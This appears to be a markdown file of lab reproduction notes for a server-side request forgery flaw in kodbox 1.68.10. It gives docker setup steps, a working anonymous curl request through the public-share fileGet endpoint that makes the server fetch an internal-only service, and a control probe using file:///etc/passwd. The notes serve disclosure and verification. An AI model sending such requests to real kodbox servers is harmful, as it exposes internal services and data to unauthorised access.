# Local reproduction notes

These steps summarize the **supplied report's** reproduction. Run them only against a kodbox instance you control. The quoted responses are the report's recorded output; they were not generated again during repository preparation.

## Setup

1. Start the official image locally, with the web port bound to loopback:

   ```console
   docker run -d --name kodbox-ssrf-lab -p 127.0.0.1:8089:80 kodcloud/kodbox:1.68.10
   ```

2. Complete the installer in your local browser. Create a passwordless, non-expired public share for a test file and copy its share ID. Do not use a production share or include the ID in a public artifact.
3. Inside the container, create a harmless test response and start an HTTP service bound to `127.0.0.1:9999`. Port 9999 remains unmapped to the host:

   ```console
   docker exec kodbox-ssrf-lab sh -c 'mkdir -p /tmp/ssrf-lab && printf INTERNAL-ONLY-DATA > /tmp/ssrf-lab/x'
   docker exec -d kodbox-ssrf-lab sh -c 'cd /tmp/ssrf-lab && python3 -m http.server 9999 --bind 127.0.0.1'
   ```

## Test request

Set `SHARE_ID` to the ID from your own test instance. The request must be made without an authenticated browser session or cookies.

```bash
SHARE_ID='YOUR_LOCAL_PUBLIC_SHARE_ID'
curl --get --silent --show-error \
  'http://127.0.0.1:8089/index.php?explorer/share/fileGet' \
  --data-urlencode "shareID=$SHARE_ID" \
  --data-urlencode 'path=http://127.0.0.1:9999/x'
```

The supplied report records `"code": true` and `"data": { ..., "content": "INTERNAL-ONLY-DATA" }`. The response demonstrates that the kodbox server fetched a service reachable only inside its container and reflected the body to the anonymous client.

## Controls

- Replace `path` with `file:///etc/passwd`: the supplied report records a permission error, consistent with the URL-scheme whitelist.
- Replace the valid share ID with an invalid value: the supplied report records “share does not exist.”
- Confirm port 9999 was not published to the host. This distinguishes the server-side fetch from a direct client request.

Do not include session-cookie values, installer credentials, real internal service responses, or third-party addresses in shared evidence.
